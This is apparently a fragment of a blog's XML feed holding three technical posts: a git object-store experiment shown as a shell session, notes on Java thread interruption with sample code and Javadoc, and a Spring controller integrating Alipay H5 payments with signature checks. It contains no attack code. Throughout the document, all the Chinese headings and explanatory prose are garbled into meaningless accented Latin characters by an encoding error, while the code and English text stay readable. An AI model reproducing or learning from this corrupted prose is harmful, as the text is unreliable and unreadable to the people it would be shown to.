./git/objectÈáåÈù¢ÊúâÂæàÂ§öÊñá‰ª∂,Êàë‰ª¨ÊâìÂºÄ,hashÂÄºÁöÑÂâç‰∏§‰∏™Â≠óÊØçÁöÑÊñá‰ª∂Â§π,ÈáåÈù¢ÁöÑÊñá‰ª∂ÂØπÂ∫îhash‰∏§‰ΩçÂêéÁöÑÂ≠óÁ¨¶‰∏≤Âú®ËøôÈáå,ÊàëÂÅö‰∫Ü‰∏™ÊúâË∂£ÁöÑËØïÈ™å,Â∞ÜÊñá‰ª∂Êèê‰∫§Âêé,Âèà‰øÆÊîπ‰∫Ü‰∏Ä‰∏ã,Êàë‰ª¨ÂèØ‰ª•ÊâæÂà∞.git/objectÈáåÈù¢Êñ∞ÁöÑÊñá‰ª∂,ÊóßÁöÑÊñá‰ª∂ÂèØ‰ª•ÊâæÂà∞,Êñ∞ÁöÑÊñá‰ª∂‰πüÂèØ‰ª•ÊâæÂà∞,‰πüËÆ∏ËøôÊ†∑ÂèØ‰ª•ÂÆûÁé∞ÂõûÈÄÄÂêß.huskyui@ubuntu:~$ echo &quot;aaa&quot;|git hash-object --stdin72943a16fb2c8f38f9dde202b7a70ccc19c52f34huskyui@ubuntu:~/Desktop/git/lesson03$ cat c.txtaaahuskyui@ubuntu:~/Desktop/git/lesson03$ git cat-file -p HEADtree 27bec35d12fd2435823df93eb1f39622f46051d2parent 1ac6576b5e450f5e23238fbf87bc1d9cdf916366author huskyui &lt;2207019991@qq.com&gt; 1556801948 -0700committer huskyui &lt;2207019991@qq.com&gt; 1556801948 -0700fourth commithuskyui@ubuntu:~/Desktop/git/lesson03$ git cat-file -p 27bec35d12fd2435823df93eb1f39622f46051d2100644 blob 340fef996d5ad07e8c2b9e3f413798abec2bc43d    a.txt100644 blob f6ab3cf9d6e218cdcc1ca089327389503b152bf8    b.txt100644 blob 72943a16fb2c8f38f9dde202b7a70ccc19c52f34    c.txtc.txt hashhuskyui@ubuntu:~/Desktop/git/lesson03$ cd .githuskyui@ubuntu:~/Desktop/git/lesson03/.git$ cd objects/huskyui@ubuntu:~/Desktop/git/lesson03/.git/objects$ cd 72huskyui@ubuntu:~/Desktop/git/lesson03/.git/objects/72$ ls943a16fb2c8f38f9dde202b7a70ccc19c52f34</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>interrupt</title>
      <link href="/2019/04/29/interrupt/"/>
      <url>/2019/04/29/interrupt/</url>
      
        <content type="html"><![CDATA[<h4 id="interrupt"><a href="#interrupt" class="headerlink" title="interrupt"></a>interrupt</h4><h3 id="È¶ñÂÖàÊ¢≥ÁêÜThreadÂÖ≥‰∫éinterruptÁöÑÂÆö‰πâ"><a href="#È¶ñÂÖàÊ¢≥ÁêÜThreadÂÖ≥‰∫éinterruptÁöÑÂÆö‰πâ" class="headerlink" title="È¶ñÂÖàÊ¢≥ÁêÜThreadÂÖ≥‰∫éinterruptÁöÑÂÆö‰πâ"></a>È¶ñÂÖàÊ¢≥ÁêÜThreadÂÖ≥‰∫éinterruptÁöÑÂÆö‰πâ</h3><pre><code>/** * Interrupts this thread. * * &lt;p&gt; Unless the current thread is interrupting itself, which is * always permitted, the {@link #checkAccess() checkAccess} method * of this thread is invoked, which may cause a {@link * SecurityException} to be thrown. * * &lt;p&gt; If this thread is blocked in an invocation of the {@link * Object#wait() wait()}, {@link Object#wait(long) wait(long)}, or {@link * Object#wait(long, int) wait(long, int)} methods of the {@link Object} * class, or of the {@link #join()}, {@link #join(long)}, {@link * #join(long, int)}, {@link #sleep(long)}, or {@link #sleep(long, int)}, * methods of this class, then its interrupt status will be cleared and it * will receive an {@link InterruptedException}. * * &lt;p&gt; If this thread is blocked in an I/O operation upon an {@link * java.nio.channels.InterruptibleChannel InterruptibleChannel} * then the channel will be closed, the thread&apos;s interrupt * status will be set, and the thread will receive a {@link * java.nio.channels.ClosedByInterruptException}. * * &lt;p&gt; If this thread is blocked in a {@link java.nio.channels.Selector} * then the thread&apos;s interrupt status will be set and it will return * immediately from the selection operation, possibly with a non-zero * value, just as if the selector&apos;s {@link * java.nio.channels.Selector#wakeup wakeup} method were invoked. * * &lt;p&gt; If none of the previous conditions hold then this thread&apos;s interrupt * status will be set. &lt;/p&gt; * * &lt;p&gt; Interrupting a thread that is not alive need not have any effect. * * @throws  SecurityException *          if the current thread cannot modify this thread * * @revised 6.0 * @spec JSR-51 */public void interrupt() </code></pre><h3 id="ËøôÈáåËÆ≤Ëø∞‰∫ÜThreadÂÆû‰æãÂØπË±°Ë∞ÉÁî®ÊñπÊ≥ïinterrupt-ÊúâËøôÂá†ÁßçÊÉÖÂÜµ"><a href="#ËøôÈáåËÆ≤Ëø∞‰∫ÜThreadÂÆû‰æãÂØπË±°Ë∞ÉÁî®ÊñπÊ≥ïinterrupt-ÊúâËøôÂá†ÁßçÊÉÖÂÜµ" class="headerlink" title="ËøôÈáåËÆ≤Ëø∞‰∫ÜThreadÂÆû‰æãÂØπË±°Ë∞ÉÁî®ÊñπÊ≥ïinterrupt,ÊúâËøôÂá†ÁßçÊÉÖÂÜµ"></a>ËøôÈáåËÆ≤Ëø∞‰∫ÜThreadÂÆû‰æãÂØπË±°Ë∞ÉÁî®ÊñπÊ≥ïinterrupt,ÊúâËøôÂá†ÁßçÊÉÖÂÜµ</h3><p>‚Äã 1.Âú®Á∫øÁ®ãÈáåÈù¢Êúâwait,sleep,joinÊñπÊ≥ï,‰ºöÂºπÂá∫InterruptedException,Áä∂ÊÄÅ‰ºöË¢´Ê∏ÖÈô§</p><p>‚Äã 2.ioÈáåÈù¢,‰ºöÂºπÂá∫ÂºÇÂ∏∏,Áä∂ÊÄÅ‰ºöË¢´ËÆæÁΩÆ,‚Ä¶</p><p>‚Äã 3.Â¶ÇÊûúÁ∫øÁ®ãÈòªÂ°ûÂú®nio‰∏≠ÁöÑSelector‰∏≠,Áä∂ÊÄÅ‰ºöË¢´ËÆæÁΩÆ,‚Ä¶</p><p>‚Äã 4.Â¶ÇÊûú‰∏çÊòØ‰∏äÈù¢,Ëøô‰∫õÊÉÖÂÜµ,Áä∂ÊÄÅ‰ºöË¢´ËÆæÁΩÆ</p><h3 id="ÂèØ‰ª•ÁúãÂá∫interruptÊòØÂÖ≥‰∫éÁä∂ÊÄÅÁöÑËÆæÁΩÆ"><a href="#ÂèØ‰ª•ÁúãÂá∫interruptÊòØÂÖ≥‰∫éÁä∂ÊÄÅÁöÑËÆæÁΩÆ" class="headerlink" title="ÂèØ‰ª•ÁúãÂá∫interruptÊòØÂÖ≥‰∫éÁä∂ÊÄÅÁöÑËÆæÁΩÆ"></a>ÂèØ‰ª•ÁúãÂá∫interruptÊòØÂÖ≥‰∫éÁä∂ÊÄÅÁöÑËÆæÁΩÆ</h3><h3 id="Êàë‰ª¨Êù•È™åËØÅ‰∏Ä‰∏ã"><a href="#Êàë‰ª¨Êù•È™åËØÅ‰∏Ä‰∏ã" class="headerlink" title="Êàë‰ª¨Êù•È™åËØÅ‰∏Ä‰∏ã"></a>Êàë‰ª¨Êù•È™åËØÅ‰∏Ä‰∏ã</h3><h4 id="Á¨¨‰∏ÄÁßç-Ê≤°Êúâ‰ªª‰ΩïÊÉÖÂÜµÁöÑ"><a href="#Á¨¨‰∏ÄÁßç-Ê≤°Êúâ‰ªª‰ΩïÊÉÖÂÜµÁöÑ" class="headerlink" title="Á¨¨‰∏ÄÁßç,Ê≤°Êúâ‰ªª‰ΩïÊÉÖÂÜµÁöÑ"></a>Á¨¨‰∏ÄÁßç,Ê≤°Êúâ‰ªª‰ΩïÊÉÖÂÜµÁöÑ</h4><pre><code>public static void main(String[] args) {    Thread t1 = new Thread(()-&gt;{       while(true){           if (interrupted()) {               break;           }           System.out.println(&quot;i&quot; + new Date());       }    });    t1.start();    try {        Thread.sleep(1000);    } catch (InterruptedException e) {        e.printStackTrace();    }    t1.interrupt();}</code></pre><h3 id="Á∫øÁ®ã‰ºöÂú®-1000-msÂêéÁªìÊùü-Êï¥‰∏™Á®ãÂ∫è‰πü‰ºöÁªìÊùü"><a href="#Á∫øÁ®ã‰ºöÂú®-1000-msÂêéÁªìÊùü-Êï¥‰∏™Á®ãÂ∫è‰πü‰ºöÁªìÊùü" class="headerlink" title="Á∫øÁ®ã‰ºöÂú®(1000+)msÂêéÁªìÊùü,Êï¥‰∏™Á®ãÂ∫è‰πü‰ºöÁªìÊùü"></a>Á∫øÁ®ã‰ºöÂú®(1000+)msÂêéÁªìÊùü,Êï¥‰∏™Á®ãÂ∫è‰πü‰ºöÁªìÊùü</h3><h4 id="Á¨¨‰∫åÁßç-ÊúâsleepÁöÑÊÉÖÂÜµ‰∏ã"><a href="#Á¨¨‰∫åÁßç-ÊúâsleepÁöÑÊÉÖÂÜµ‰∏ã" class="headerlink" title="Á¨¨‰∫åÁßç,ÊúâsleepÁöÑÊÉÖÂÜµ‰∏ã"></a>Á¨¨‰∫åÁßç,ÊúâsleepÁöÑÊÉÖÂÜµ‰∏ã</h4><pre><code>public static void main(String[] args) {    Thread t1 = new Thread(()-&gt;{       while(true){           if (interrupted()) {               break;           }           try {               Thread.sleep(100);           } catch (InterruptedException e) {               e.printStackTrace();           }           System.out.println(&quot;i&quot; + new Date());       }    });    t1.start();    try {        Thread.sleep(1000);    } catch (InterruptedException e) {        e.printStackTrace();    }    t1.interrupt();}</code></pre><h3 id="ÊñπÊ≥ïÂπ∂‰∏ç‰ºöÈÄÄÂá∫-Âè™ÊòØÊâìÂá∫‰∫Ü‰∏Ä‰∏™InterruptException"><a href="#ÊñπÊ≥ïÂπ∂‰∏ç‰ºöÈÄÄÂá∫-Âè™ÊòØÊâìÂá∫‰∫Ü‰∏Ä‰∏™InterruptException" class="headerlink" title="ÊñπÊ≥ïÂπ∂‰∏ç‰ºöÈÄÄÂá∫,Âè™ÊòØÊâìÂá∫‰∫Ü‰∏Ä‰∏™InterruptException"></a>ÊñπÊ≥ïÂπ∂‰∏ç‰ºöÈÄÄÂá∫,Âè™ÊòØÊâìÂá∫‰∫Ü‰∏Ä‰∏™InterruptException</h3><blockquote><p>‰ΩúËÄÖÔºöÂ§ßÈó≤‰∫∫Êü¥ÊØõÊØõ</p><p>ÈìæÊé•Ôºö<a href="https://www.zhihu.com/question/41048032/answer/252905837" target="_blank" rel="noopener">https://www.zhihu.com/question/41048032/answer/252905837</a></p><p>Êù•Ê∫êÔºöÁü•‰πé</p><p>Ëëó‰ΩúÊùÉÂΩí‰ΩúËÄÖÊâÄÊúâ„ÄÇÂïÜ‰∏öËΩ¨ËΩΩËØ∑ËÅîÁ≥ª‰ΩúËÄÖËé∑ÂæóÊéàÊùÉÔºåÈùûÂïÜ‰∏öËΩ¨ËΩΩËØ∑Ê≥®ÊòéÂá∫Â§Ñ„ÄÇ</p><h2 id="Â¶Ç‰ΩïÂ§ÑÁêÜ‰∏≠Êñ≠Ôºü"><a href="#Â¶Ç‰ΩïÂ§ÑÁêÜ‰∏≠Êñ≠Ôºü" class="headerlink" title="Â¶Ç‰ΩïÂ§ÑÁêÜ‰∏≠Êñ≠Ôºü"></a><strong>Â¶Ç‰ΩïÂ§ÑÁêÜ‰∏≠Êñ≠Ôºü</strong></h2><p>‰∏äÊñáÈÉΩÂú®‰ªãÁªçÂ¶Ç‰ΩïËé∑Âèñ‰∏≠Êñ≠Áä∂ÊÄÅÔºåÈÇ£‰πàÂΩìÊàë‰ª¨ÊçïËé∑Âà∞‰∏≠Êñ≠Áä∂ÊÄÅÂêéÔºåÁ©∂Á´üÂ¶Ç‰ΩïÂ§ÑÁêÜÂë¢Ôºü</p><p>  *<br>JavaÁ±ªÂ∫ì‰∏≠Êèê‰æõÁöÑ‰∏Ä‰∫õÂèØËÉΩ‰ºöÂèëÁîüÈòªÂ°ûÁöÑÊñπÊ≥ïÈÉΩ‰ºöÊäõInterruptedExceptionÂºÇÂ∏∏ÔºåÂ¶ÇÔºöBlockingQueue#put„ÄÅBlockingQueue#take„ÄÅObject#wait„ÄÅThread#sleep„ÄÇ<br>  *<br>ÂΩì‰Ω†Âú®Êüê‰∏ÄÊù°Á∫øÁ®ã‰∏≠Ë∞ÉÁî®Ëøô‰∫õÊñπÊ≥ïÊó∂ÔºåËøô‰∏™ÊñπÊ≥ïÂèØËÉΩ‰ºöË¢´ÈòªÂ°ûÂæàÈïøÊó∂Èó¥Ôºå‰Ω†ÂèØ‰ª•Âú®Âà´ÁöÑÁ∫øÁ®ã‰∏≠Ë∞ÉÁî®ÂΩìÂâçÁ∫øÁ®ãÂØπË±°ÁöÑinterruptÊñπÊ≥ïËß¶ÂèëËøô‰∫õÂáΩÊï∞ÊäõÂá∫InterruptedExceptionÂºÇÂ∏∏„ÄÇ</p><ul><li>ÂΩì‰∏Ä‰∏™ÂáΩÊï∞ÊäõÂá∫InterruptedExceptionÂºÇÂ∏∏Êó∂ÔºåË°®Á§∫Ëøô‰∏™ÊñπÊ≥ïÈòªÂ°ûÁöÑÊó∂Èó¥Â§™‰πÖ‰∫ÜÔºåÂà´‰∫∫‰∏çÊÉ≥Á≠âÂÆÉÊâßË°åÁªìÊùü‰∫Ü„ÄÇ</li><li>ÂΩì‰Ω†ÁöÑÊçïËé∑Âà∞‰∏Ä‰∏™InterruptedExceptionÂºÇÂ∏∏ÂêéÔºå‰∫¶ÂèØ‰ª•Â§ÑÁêÜÂÆÉÔºåÊàñËÄÖÂêë‰∏äÊäõÂá∫„ÄÇ</li><li>ÊäõÂá∫Êó∂Ë¶ÅÊ≥®ÊÑèÔºüÔºüÔºüÔºöÂΩì‰Ω†ÊçïËé∑Âà∞InterruptedExceptionÂºÇÂ∏∏ÂêéÔºåÂΩìÂâçÁ∫øÁ®ãÁöÑ‰∏≠Êñ≠Áä∂ÊÄÅÂ∑≤ÁªèË¢´‰øÆÊîπ‰∏∫false(Ë°®Á§∫Á∫øÁ®ãÊú™Ë¢´‰∏≠Êñ≠)ÔºõÊ≠§Êó∂‰Ω†Ëã•ËÉΩÂ§üÂ§ÑÁêÜ‰∏≠Êñ≠ÔºåÂàô‰∏çÁî®ÁêÜ‰ºöËØ•ÂÄºÔºõ‰ΩÜÂ¶ÇÊûú‰Ω†ÁªßÁª≠Âêë‰∏äÊäõInterruptedExceptionÂºÇÂ∏∏Ôºå‰Ω†ÈúÄË¶ÅÂÜçÊ¨°Ë∞ÉÁî®interruptÊñπÊ≥ïÔºåÂ∞ÜÂΩìÂâçÁ∫øÁ®ãÁöÑ‰∏≠Êñ≠Áä∂ÊÄÅËÆæ‰∏∫true„ÄÇ</li><li><strong>Ê≥®ÊÑè</strong><br>ÔºöÁªùÂØπ‰∏çËÉΩ‚ÄúÂêûÊéâ‰∏≠Êñ≠‚ÄùÔºÅÂç≥ÊçïËé∑‰∫ÜInterruptedExceptionËÄå‰∏ç‰Ωú‰ªª‰ΩïÂ§ÑÁêÜ„ÄÇËøôÊ†∑ËøùËÉå‰∫Ü‰∏≠Êñ≠Êú∫Âà∂ÁöÑËßÑÂàôÔºåÂà´‰∫∫ÊÉ≥ËÆ©‰Ω†Á∫øÁ®ã‰∏≠Êñ≠ÔºåÁÑ∂ËÄå‰Ω†Ëá™Â∑±‰∏çÂ§ÑÁêÜÔºå‰πü‰∏çÂ∞Ü‰∏≠Êñ≠ËØ∑Ê±ÇÂëäËØâË∞ÉÁî®ËÄÖÔºåË∞ÉÁî®ËÄÖ‰∏ÄÁõ¥‰ª•‰∏∫Ê≤°Êúâ‰∏≠Êñ≠ËØ∑Ê±Ç„ÄÇ</li></ul></blockquote><h3 id="Êõ¥Êñ∞Áõ∏ÂÖ≥interruptÊñπÊ≥ïÁöÑÊÑè‰πâ"><a href="#Êõ¥Êñ∞Áõ∏ÂÖ≥interruptÊñπÊ≥ïÁöÑÊÑè‰πâ" class="headerlink" title="Êõ¥Êñ∞Áõ∏ÂÖ≥interruptÊñπÊ≥ïÁöÑÊÑè‰πâ"></a>Êõ¥Êñ∞Áõ∏ÂÖ≥interruptÊñπÊ≥ïÁöÑÊÑè‰πâ</h3><h2 id="public-void-interrupt"><a href="#public-void-interrupt" class="headerlink" title="public void interrupt()"></a><code>public void interrupt()</code></h2><p>ThreadÈáåÈù¢ÁöÑÊâìÊñ≠ÂáΩÊï∞,ÂèØ‰ª•‰ΩøÁî®Êñ∞Âª∫‰∏Ä‰∏™ThreadÂØπË±°,ÊâßË°å <code>thread.interrupt();</code></p><p>‰øÆÊîπË∞ÉÁî®Á∫øÁ®ãÁöÑinterrupt ÁöÑstatus</p><h2 id="public-static-boolean-interrupted"><a href="#public-static-boolean-interrupted" class="headerlink" title="public static boolean interrupted()"></a><code>public static boolean interrupted()</code></h2><p>ËØ•ÊñπÊ≥ïÂèØ‰ª•Âà§Êñ≠ÊòØÂê¶Ë¢´ÊâìÊñ≠,‰ΩÜÊòØËøô‰∏™interruptÁöÑstatus‰ºöË¢´Ê∏ÖÈô§,</p><pre><code>/**     * Tests whether the current thread has been interrupted.  The     * &lt;i&gt;interrupted status&lt;/i&gt; of the thread is cleared by this method.  In     * other words, if this method were to be called twice in succession, the     * second call would return false (unless the current thread were     * interrupted again, after the first call had cleared its interrupted     * status and before the second call had examined it).     *     * &lt;p&gt;A thread interruption ignored because a thread was not alive     * at the time of the interrupt will be reflected by this method     * returning false.     *     * @return  &lt;code&gt;true&lt;/code&gt; if the current thread has been interrupted;     *          &lt;code&gt;false&lt;/code&gt; otherwise.     * @see #isInterrupted()     * @revised 6.0     */</code></pre><h2 id="public-boolean-isInterrupted"><a href="#public-boolean-isInterrupted" class="headerlink" title="public boolean isInterrupted()"></a><code>public boolean isInterrupted()</code></h2><p>ËØ•ÊñπÊ≥ïÂèØ‰ª•Âà§Êñ≠ÊòØÂê¶Ë¢´ÊâìÊñ≠</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂπ∂Âèë </tag>
            
            <tag> interrupt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÊîØ‰ªòÂÆùH5ÊîØ‰ªò</title>
      <link href="/2019/01/23/%E6%94%AF%E4%BB%98%E5%AE%9DH5%E6%94%AF%E4%BB%98/"/>
      <url>/2019/01/23/%E6%94%AF%E4%BB%98%E5%AE%9DH5%E6%94%AF%E4%BB%98/</url>
      
        <content type="html"><![CDATA[<h3 id="ÊàëËøôÈáåÊåáÁöÑÊòØÂæÆ‰ø°Â∑•‰ΩúÂè∑‰∏≠ÊâìÂºÄÊîØ‰ªòÂÆùÊîØ‰ªò"><a href="#ÊàëËøôÈáåÊåáÁöÑÊòØÂæÆ‰ø°Â∑•‰ΩúÂè∑‰∏≠ÊâìÂºÄÊîØ‰ªòÂÆùÊîØ‰ªò" class="headerlink" title="ÊàëËøôÈáåÊåáÁöÑÊòØÂæÆ‰ø°Â∑•‰ΩúÂè∑‰∏≠ÊâìÂºÄÊîØ‰ªòÂÆùÊîØ‰ªò"></a>ÊàëËøôÈáåÊåáÁöÑÊòØÂæÆ‰ø°Â∑•‰ΩúÂè∑‰∏≠ÊâìÂºÄÊîØ‰ªòÂÆùÊîØ‰ªò</h3><p><a href="https://docs.open.alipay.com/203/107084/" target="_blank" rel="noopener"> ÊñáÊ°£ </a></p><p><strong>‰∏äÈù¢ÊñáÊ°£‰∏ÄÂÆöË¶Å‰ªîÁªÜÈòÖËØª</strong></p><p>[Âø´ÈÄüÊé•ÂÖ•]( <a href="https://docs.open.alipay.com/203/105285/%EF%BC%89" target="_blank" rel="noopener"> https://docs.open.alipay.com/203/105285/Ôºâ</a></p><pre><code>@RequestMapping(&quot;/alipay&quot;)public void alipay(@RequestParam(&quot;orderNumber&quot;) String orderNumber, HttpServletRequest request, HttpServletResponse response) throws Exception{    OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;()                                                .eq(&quot;order_number&quot;,orderNumber));    orderInfoService.updateById(info);    String orderNo = (System.currentTimeMillis()+&quot;&quot;).substring(1)+(System.nanoTime()+&quot;&quot;).substring(7,8);    String totalAmount = info.getOrderMoney().toString();    String subject = info.getOrderProject();    //Â∞ÅË£ÖËØ∑Ê±ÇÂÆ¢Êà∑Á´Ø    AlipayClient client = new        DefaultAlipayClient (url,app_id,private_key,format,charset,                             public_key,signtype );    //ÊîØ‰ªòËØ∑Ê±Ç    AlipayTradeWapPayRequest alipayRequest = new AlipayTradeWapPayRequest();    alipayRequest.setReturnUrl(&quot;http://XXXX.com/xxxx/api/returnUrl?orderNumber=&quot;+orderNumber);    alipayRequest.setNotifyUrl(&quot;http://xxxx.com/xxxx/api/notifyUrl&quot;);    AlipayTradeWapPayModel model = new AlipayTradeWapPayModel();    model.setProductCode(&quot;QUICK_WAP_PAY&quot;);    model.setOutTradeNo(orderNo);    model.setSubject(subject);    model.setTotalAmount(totalAmount);    model.setBody(info.getOrderProject());    alipayRequest.setBizModel(model);    String form = client.pageExecute(alipayRequest).getBody();    response.setContentType(&quot;text/html;charset=&quot;+charset);    response.getWriter().write(form);    response.getWriter().flush();    response.getWriter().close();}</code></pre><p><strong>ËøôÈáåÊúâÁÇπÂÉèËÄÅÂºèÁöÑservletÊ∏≤ÊüìÁïåÈù¢</strong></p><p><strong>ËøôÈáåÁöÑÂèÇÊï∞ÔºåËØ∑Ê†πÊçÆÂÆòÊñπÁöÑÊåáÂºï</strong></p><pre><code>AlipayClient alipayClient = new DefaultAlipayClient(&quot;https://openapi.alipay.com/gateway.do&quot;, APP_ID, APP_PRIVATE_KEY, &quot;json&quot;, CHARSET, ALIPAY_PUBLIC_KEY, &quot;RSA2&quot;); //Ëé∑ÂæóÂàùÂßãÂåñÁöÑAlipayClient</code></pre><p><strong>ÁßÅÈí•ÔºåÂÖ¨Èí•ÔºåÈòøÈáåÂÖ¨Èí•ÔºåÊ†πÊçÆÂÆòÊñπÊèê‰æõÁöÑÂ∑•ÂÖ∑ÔºåÁîüÊàêÔºå‰∏äÈù¢‰ª£Á†Å‰∏≠ÈúÄË¶ÅÁöÑÊòØÁßÅÈí•ÔºåËøòÊúâÈòøÈáåÂÖ¨Èí•</strong></p><pre><code>AlipayTradeWapPayRequest alipayRequest = new AlipayTradeWapPayRequest();</code></pre><p><strong>AlipayTradeWapPayRequestËøô‰∏™Á±ªÊòØÊ∏≤ÊüìÊâãÊú∫ÁïåÈù¢ÔºåËÄåAlipayTradePagePayRequestÊ∏≤ÊüìPCÁ´Ø</strong></p><pre><code>model.setProductCode(&quot;QUICK_WAP_PAY&quot;);</code></pre><p>Ê≥®ÊÑèÊ≠§Â§ÑÁöÑproductCodeÔºå‰∏çË¶ÅÂÜôÈîô‰∫Ü</p><h2 id="ÊîØ‰ªòÂÆùÂêåÊ≠•Ë∑≥ËΩ¨"><a href="#ÊîØ‰ªòÂÆùÂêåÊ≠•Ë∑≥ËΩ¨" class="headerlink" title="ÊîØ‰ªòÂÆùÂêåÊ≠•Ë∑≥ËΩ¨"></a>ÊîØ‰ªòÂÆùÂêåÊ≠•Ë∑≥ËΩ¨</h2><pre><code>/**    * ÊîØ‰ªòÂÆùÂêåÊ≠•Ë∑≥ËΩ¨    * */   @RequestMapping(&quot;/returnUrl&quot;)   public void returnUrl(HttpServletRequest request, HttpServletResponse response) throws Exception{       String orderNumber = request.getParameter(&quot;orderNumber&quot;);       // Ëé∑ÂèñÊîØ‰ªòÂÆùGETËøáÊù•ÂèçÈ¶à‰ø°ÊÅØÔºàÂÆòÊñπÂõ∫ÂÆö‰ª£Á†ÅÔºâ       OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;()               .eq(&quot;order_number&quot;,orderNumber));       Map&lt;String, String&gt; params = new HashMap&lt;String, String&gt;();       Map&lt;String, String[]&gt; requestParams = request.getParameterMap();       for (Iterator&lt;String&gt; iter = requestParams.keySet().iterator(); iter.hasNext();) {           String name = (String) iter.next();           String[] values = (String[]) requestParams.get(name);           String valueStr = &quot;&quot;;           for (int i = 0; i &lt; values.length; i++) {               valueStr = (i == values.length - 1) ? valueStr + values[i] : valueStr + values[i] + &quot;,&quot;;           }           params.put(name, valueStr);       }       params.remove(&quot;orderNumber&quot;);       //Ê≥®ÊÑèÔºåÊàëËøôÈáåremove map‰∏≠ÁöÑorderNumberÔºåÊòØÂõ†‰∏∫Â¶ÇÊûúÂä†ÂÖ•orderNumberÔºå‰∏ãÈù¢Ëøô‰∏™ÂØπsignVerifiedÁöÑÂà§Êñ≠‰ºöÊúâÊúâÂç∞Ë±°       boolean signVerified = AlipaySignature.rsaCheckV1(params, public_key, charset, signtype);       // ËøîÂõûÁïåÈù¢       //if (signVerified) {         //  info.setOrderState(1);           //orderInfoService.updateById(info);       //}       response.sendRedirect(&quot;http://m.xxxx.com/orderDetail.html?orderNum=&quot;+orderNumber);   }</code></pre><h2 id="ÊîØ‰ªòÂÆùÊúçÂä°Âô®ÂºÇÊ≠•ÈÄöÁü•"><a href="#ÊîØ‰ªòÂÆùÊúçÂä°Âô®ÂºÇÊ≠•ÈÄöÁü•" class="headerlink" title="ÊîØ‰ªòÂÆùÊúçÂä°Âô®ÂºÇÊ≠•ÈÄöÁü•"></a>ÊîØ‰ªòÂÆùÊúçÂä°Âô®ÂºÇÊ≠•ÈÄöÁü•</h2><pre><code>/**    * ÊîØ‰ªòÂÆùÊúçÂä°Âô®ÂºÇÊ≠•ÈÄöÁü•    *    * @param request    * @throws Exception    */   @RequestMapping(&quot;/notifyUrl&quot;)   public void notifyUrl(HttpServletRequest request, PrintWriter out) throws Exception {       // Ëé∑ÂèñÊîØ‰ªòÂÆùGETËøáÊù•ÂèçÈ¶à‰ø°ÊÅØ       Map&lt;String, String&gt; params = new HashMap&lt;String, String&gt;();       Map&lt;String, String[]&gt; requestParams = request.getParameterMap();       for (Iterator&lt;String&gt; iter = requestParams.keySet().iterator(); iter.hasNext();) {           String name = (String) iter.next();           String[] values = (String[]) requestParams.get(name);           String valueStr = &quot;&quot;;           for (int i = 0; i &lt; values.length; i++) {               valueStr = (i == values.length - 1) ? valueStr + values[i] : valueStr + values[i] + &quot;,&quot;;           }           params.put(name, valueStr);       }       boolean signVerified = AlipaySignature.rsaCheckV1(params, public_key, charset, signtype); // Ë∞ÉÁî®SDKÈ™åËØÅÁ≠æÂêç       if (signVerified) { // È™åËØÅÊàêÂäü Êõ¥Êñ∞ËÆ¢Âçï‰ø°ÊÅØ           System.out.println(&quot;ÂºÇÊ≠•ÈÄöÁü•ÊàêÂäü&quot;);           // ÂïÜÊà∑ËÆ¢ÂçïÂè∑           String out_trade_no = request.getParameter(&quot;out_trade_no&quot;);           // ‰∫§ÊòìÁä∂ÊÄÅ           String trade_status = request.getParameter(&quot;trade_status&quot;);           // ‰øÆÊîπÊï∞ÊçÆÂ∫ì           //Ëé∑Âèñout_trade_noÔºåËé∑ÂèñorderNumberÔºåËøõË°å‰øÆÊîπ           out.println(&quot;success&quot;);           out.flush();       } else {           System.out.println(&quot;ÂºÇÊ≠•ÈÄöÁü•Â§±Ë¥•&quot;);           out.println(&quot;fail&quot;);       }   }</code></pre><hr><hr><p><strong>ËøôÈáåÈÄöÁü•ÊîØ‰ªòÂÆùÔºåÊàëÊî∂Âà∞‰∫ÜÔºåËøîÂõûsuccess</strong></p><h2 id="ËøòÊúâ‰∏Ä‰∏™ÈáçË¶ÅÈóÆÈ¢òÔºåÈÇ£Â∞±ÊòØÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÈáåÈù¢ÂØπÊîØ‰ªòÂÆùÊîØ‰ªòÊòØÊã¶Êà™"><a href="#ËøòÊúâ‰∏Ä‰∏™ÈáçË¶ÅÈóÆÈ¢òÔºåÈÇ£Â∞±ÊòØÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÈáåÈù¢ÂØπÊîØ‰ªòÂÆùÊîØ‰ªòÊòØÊã¶Êà™" class="headerlink" title="ËøòÊúâ‰∏Ä‰∏™ÈáçË¶ÅÈóÆÈ¢òÔºåÈÇ£Â∞±ÊòØÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÈáåÈù¢ÂØπÊîØ‰ªòÂÆùÊîØ‰ªòÊòØÊã¶Êà™"></a>ËøòÊúâ‰∏Ä‰∏™ÈáçË¶ÅÈóÆÈ¢òÔºåÈÇ£Â∞±ÊòØÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÈáåÈù¢ÂØπÊîØ‰ªòÂÆùÊîØ‰ªòÊòØÊã¶Êà™</h2><p><a href="https://docs.open.alipay.com/203/105285/" target="_blank" rel="noopener"> ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑Âπ≥Âè∞Êó†Ê≥ï‰ΩøÁî®ÊîØ‰ªòÂÆùÊîØ‰ªòÁöÑËß£ÂÜ≥ÊñπÊ°à </a></p><p>Â∞ÜhtmlÊñá‰ª∂ÂíåjsÊñá‰ª∂ÊîæÂÖ•È°πÁõÆ‰∏≠„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> ÊîØ‰ªò </tag>
            
            <tag> ÊîØ‰ªòÂÆùH5ÊîØ‰ªò </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÊîØ‰ªòÂÆùPCÊîØ‰ªò</title>
      <link href="/2019/01/23/%E6%94%AF%E4%BB%98%E5%AE%9DPC%E6%94%AF%E4%BB%98/"/>
      <url>/2019/01/23/%E6%94%AF%E4%BB%98%E5%AE%9DPC%E6%94%AF%E4%BB%98/</url>
      
